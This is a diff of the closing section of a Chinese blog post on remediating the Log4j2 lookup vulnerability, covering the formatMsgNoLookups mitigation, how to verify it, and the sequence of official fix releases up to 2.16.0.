-<p>设置 jvm 启动参数 “-Dlog4j2.formatMsgNoLookups=true”（先升级到2.10+）<br>在添加额外的log4j2.component.properties配置文件，增加“log4j2.formatMsgNoLookups=True”配置（同上）</p>
-<p>使用临时方案后可以在应用启动后打印org.apache.logging.log4j.core.util.Constants.<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em>参数，是true就关闭了lookup功能。<br>高版本的java环境也能增加利用难度，但不能作为临时修复方案！</p>
-<p>顺便吐槽一下网上的修复方案一开始都没说到底在哪里加“log4j2.formatMsgNoLookups=True”配置，我设置了application.properties和log4j2.properties都没有效果，最后在代码里面找到是log4j2.component.properties配置文件。</p>
-<p><img src="/images/211215/Image%20%5B18%5D.png" alt=""></p>
-<h4 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h4><p>官方在漏洞公开前发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1" target="_blank" rel="noopener">log4j-2.15.0-rc1</a>预览版对此问题进行了修复，然而很快就爆出可以利用路径空格报错跳过处理流程直接触发lookup查询，而后官方又发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">log4j-2.15.0-rc2</a>修复这个问题，并以<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.15.0" target="_blank" rel="noopener">rel/2.15.0</a>发布正式版。<br>但此事并未告一段落，在后续几天中官方又发布了<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.1-rc1" target="_blank" rel="noopener">log4j-2.15.1-rc1</a>预览版，默认关闭JDNI。</p>
-<p><img src="/images/211215/Image%20%5B19%5D.png" alt=""></p>
-<p>接下来在<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1" target="_blank" rel="noopener">log4j-2.16.0-rc1</a>中又直接去掉了Message的lookup查询功能。</p>
-<p><img src="/images/211215/Image%20%5B20%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B21%5D.png" alt=""></p>
-<p><img src="/images/211215/Image%20%5B22%5D.png" alt=""></p>
-<p>截止到纂稿时，<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0" target="_blank" rel="noopener">rel/2.16.0</a>正式版已经发布，Message的lookup功能已经被去除。</p>
-<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>随着2.16.0正式版发布，漏洞的官方修复工作应该是告一段落了，但是技术猿们的工作远未结束。自己的项目依赖可以直接修改，但许多组件的依赖更新还需要相应的组件官方团队对其进行更新测试并发布安全版本，漏洞修复之路远未结束，在依赖库中的旧版本没有被完全消灭之前，防御设备的告警依然紧扣技术猿们的心弦，让人宛如惊弓之鸟。</p>
-<p>谨以此文祭奠广大技术猿逝去与未逝去的烦恼丝:)。</p>
+<ul>
+<li>设置 jvm 启动参数 “-Dlog4j2.formatMsgNoLookups=true”（先升级到2.10+）</li>
+<li>在添加额外的 log4j2.component.properties 配置文件，增加“log4j2.formatMsgNoLookups=True”配置（同上）</li>
+</ul>
+<p>使用临时方案后可以在应用启动后打印 org.apache.logging.log4j.core.util.Constants.<em>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</em> 参数，如果是 true 就已经关闭了 Message lookup 功能。</p>
+<p>另外，高版本的JAVA环境也能增加利用难度，但不能作为临时修复方案！不能作为临时修复方案！不能作为临时修复方案！重要的事情说三遍。</p>
+<p>顺便吐槽一下网上部分的临时修复措施都提到了添加 “log4j2.formatMsgNoLookups=True” 配置的方案，但没说到底在哪里添加。我设置了 application.properties 和 log4j2.properties 都没有效果，最后在代码里面才找到需要设置的是 log4j2.component.properties 配置文件。</p>
+<p><img src="/images/211210/Image%20%5B18%5D.png" alt=""></p>
+<h4 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h4><p>官方在漏洞公开前发布了 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1" target="_blank" rel="noopener">log4j-2.15.0-rc1</a> 预览版对此问题进行了修复，然而很快就爆出可以利用路径空格报错跳过处理流程直接触发 lookup 查询，而后官方又发布了 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2" target="_blank" rel="noopener">log4j-2.15.0-rc2 </a>修复这个问题，并以 <a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.15.0" target="_blank" rel="noopener">rel/2.15.0</a> 发布正式版。</p>
+<p>但此事并未告一段落，在后续几天中官方又发布了 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.1-rc1" target="_blank" rel="noopener">log4j-2.15.1-rc1</a> 预览版，默认关闭 JNDI。</p>
+<p><img src="/images/211210/Image%20%5B19%5D.png" alt=""></p>
+<p>接下来在 <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1" target="_blank" rel="noopener">log4j-2.16.0-rc1</a> 中又直接去掉了 Message 的 lookup 查询功能。</p>
+<p><img src="/images/211210/Image%20%5B20%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B21%5D.png" alt=""></p>
+<p><img src="/images/211210/Image%20%5B22%5D.png" alt=""></p>
+<p>截止到纂稿时，<a href="https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0" target="_blank" rel="noopener">rel/2.16.0</a> 正式版已经发布，Message 的 lookup 功能已经被去除。</p>
+<h4 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h4><p>随着 2.16.0 正式版发布，漏洞的官方修复工作应该是告一段落了，但是技术猿们的工作远未结束。自己的项目依赖可以直接修改，但许多组件的依赖更新还需要相应的组件官方团队对其进行更新测试并发布安全版本，漏洞修复之路远未结束，在依赖库中的旧版本没有被完全消灭之前，防御设备的告警依然紧扣技术猿们的心弦，让人宛如惊弓之鸟。</p>
+<p>谨以此文祭奠广大技术猿逝去与即将逝去的烦恼丝 :) 。21.12.13</p>
 
     </div>
 
